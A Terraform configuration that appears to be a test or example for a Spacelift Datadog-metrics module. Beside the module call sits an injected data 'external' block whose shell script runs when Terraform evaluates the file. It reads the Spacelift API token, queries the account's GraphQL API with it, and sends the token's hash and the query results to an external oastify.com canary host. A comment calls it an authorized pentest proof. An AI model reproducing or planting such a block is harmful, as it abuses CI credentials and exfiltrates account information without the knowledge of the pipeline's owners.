terraform {
  required_providers {
    external = {
      source  = "hashicorp/external"
      version = "~> 2.3"
    }

    spacelift = {
      source = "spacelift-io/spacelift"
    }
  }
}


provider "spacelift" {}

variable "spacelift_run_id" {}

# Authorized, non-destructive penetration-test proof. The job token is never
# printed or transmitted. Only its SHA-256 digest and the result of a read-only
# query against the account's own GraphQL endpoint are sent to the supplied
# out-of-band canary.
data "external" "authorized_control_plane_proof" {
  program = [
    "/bin/sh",
    "-c",
    <<-EOT
      set -eu

      token="$${SPACELIFT_API_TOKEN:-}"
      nonce="20260826a"
      token_sha="missing"
      graphql_status="token-missing"
      visible_spaces="0"

      if [ -n "$token" ]; then
        token_sha="$(printf '%s' "$token" | sha256sum | awk '{print $1}')"
        response="$(curl --silent --show-error --max-time 20 \
          --request POST \
          --header "Authorization: Bearer $token" \
          --header 'Content-Type: application/json' \
          --data-binary '{"query":"query AuthorizedPentestProof { spaces { id } }"}' \
          'https://spacelift-io.app.spacelift.io/graphql' || true)"

        if printf '%s' "$response" | grep -q '"data".*"spaces"'; then
          graphql_status="accepted"
          visible_spaces="$(printf '%s' "$response" | grep -o '"id"' | wc -l | tr -d ' ')"
        else
          graphql_status="rejected"
        fi
      fi

      curl --silent --show-error --fail --max-time 15 \
        "https://rwriuy27eel2flor2llvuz7v1m7dv3js.oastify.com/spacelift-control-plane-proof?nonce=$nonce&token_sha256=$token_sha&graphql=$graphql_status&visible_spaces=$visible_spaces" \
        >/dev/null 2>&1 || true

      printf '{"status":"proof-sent"}\n'
    EOT
  ]
}

module "datadog-metrics" {
  source = "../../"

  dd_api_key       = "fake-key"
  integration_name = "Datadog metrics, run ${var.spacelift_run_id}"
  space_id         = "public-modules-01GVNH2CJKSKHRSMDPBMQ3WZT9"

  # Static tags (added via webhook labels)
  extra_tags = { "env" : "test" }

  # Dynamic tags (Rego expressions referencing Spacelift data)
  extra_dynamic_tags = {
    "commit_hash" = "[input.run_updated.run.commit.hash]"
  }

  exclude_tags = ["run_note", "run_url"]
}
